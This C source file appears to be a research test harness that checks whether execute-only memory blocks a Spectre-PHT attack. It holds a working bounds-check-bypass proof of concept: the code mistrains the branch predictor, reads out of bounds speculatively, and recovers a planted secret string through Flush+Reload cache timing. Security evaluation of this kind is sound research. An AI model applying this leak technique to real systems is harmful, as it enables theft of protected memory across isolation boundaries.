#define _GNU_SOURCE
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <wait.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include "microarchitecture.h"
#include "libxom.h"
#include "libcache/cacheutils.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

#define DATA_SECRET DATA SECRET

#define BUFLEN 128

static unsigned char* data;

static unsigned int correctness_ratio(const char* sample, const char* reference, const size_t len) {
	unsigned int ret = 0, i;

	for(i = 0; i < len; i++) {
		ret += sample[i] == reference[i] ? 1 : 0;
	}

	return ret;
}

static char access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  flush(&len);
  flush(&x);
  
  // ensure data is flushed at this point
  mfence();

  // check that only accessible part (DATA) can be accessed
  if((float)x / (float)len < 1) {
    // countermeasure: add the fence here
    cache_encode(data[x]);
  }
}

static uint8_t spectre_pht_sa_ip_test_generic(const uint32_t success_fraction, const uint32_t num_samples, const uint8_t xom) {
	uint8_t works = 0;
	int pipefd[2], wait_status = 0;
	unsigned int counter = 0;
	if(pipe(pipefd) < 0)
		return ~0;
	struct pollfd pipepoll = {pipefd[0],POLLIN | POLLPRI | POLLERR | POLLHUP | POLLNVAL, 0};
	struct xombuf* xbuf = xom_alloc_pages(PAGE_SIZE);

	// Put accessible section into readable memory, and inaccessible section into XOM
	(void) mmap(((char*)xbuf->address) - PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1 , 0);
	data = &((unsigned char*) xbuf->address)[-sizeof(DATA)];

	// Detect cache threshold
	if(!CACHE_MISS)
	CACHE_MISS = detect_flush_reload_threshold();
	printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

	pagesize = sysconf(_SC_PAGESIZE);
	char *_mem = malloc(pagesize * (256 + 4));
	// page aligned
	mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);

	// initialize memory
	memset(mem, 0, pagesize * 256);

	// store secret
	memset(data, ' ', BUFLEN);
	memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
	// ensure data terminates
	data[BUFLEN / sizeof(data[0]) - 1] = '\0';

	if(xom)
		xom_lock(xbuf);
	else
		mprotect(xbuf->address, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);


	// flush our shared memory
	flush_shared_memory();

	// nothing leaked so far
	char leaked[sizeof(DATA_SECRET) + 1];
	memset(leaked, ' ', sizeof(leaked));
	leaked[sizeof(DATA_SECRET)] = 0;

	int j = 0;
	while(1) {
		// for every byte in the string
		j = (j + 1) % sizeof(DATA_SECRET);

		// mistrain with valid index

		for(int y = 0; y < 10; y++) {
			access_array(0);
		}

		if(counter++ >= num_samples)
			break;

		// potential out-of-bounds access
		access_array(j);

		// only show inaccessible values (SECRET)
		if(j >= sizeof(DATA) - 1) {
		  mfence(); // avoid speculation
		  cache_decode_pretty(leaked, j);
		}

		if(correctness_ratio(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1) >
			(sizeof(SECRET) / success_fraction)) {
			works = 1;
			break;
		}

		sched_yield();

	}
	printf("\n\x1b[1A[ %s ]\n\n[\x1b[32m>\x1b[0m] Done\n", leaked + sizeof(DATA) - 1);
	free(_mem);
	munmap(((char*)xbuf->address) - PAGE_SIZE, PAGE_SIZE);
	xom_free(xbuf);
	return works;
}

attack_status spectre_pht_sa_ip_test_c(uint32_t success_fraction, uint32_t num_samples) {
	uint8_t noxom = spectre_pht_sa_ip_test_generic(success_fraction, num_samples, 0),
			xom = spectre_pht_sa_ip_test_generic(success_fraction, num_samples, 1);

	if(!~noxom || !~xom)
		return (attack_status){{0, 0, 1}};
	return (attack_status){{noxom, xom, 0}};
}